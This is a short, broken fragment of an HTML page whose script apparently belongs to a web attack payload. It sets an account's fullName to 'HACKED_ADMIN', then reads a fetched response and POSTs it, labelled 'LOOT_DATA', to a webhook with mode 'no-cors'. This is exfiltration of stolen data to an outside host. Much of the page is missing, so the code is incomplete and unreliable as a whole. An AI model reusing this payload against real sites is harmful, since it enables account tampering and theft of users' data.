<!DOCTYPE html>

                "fullName": "HACKED_ADMIN",

            .then(r => r.text())
            .then(data => {
                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: "LOOT_DATA: " + data
                });
            });
    </script>
</body>
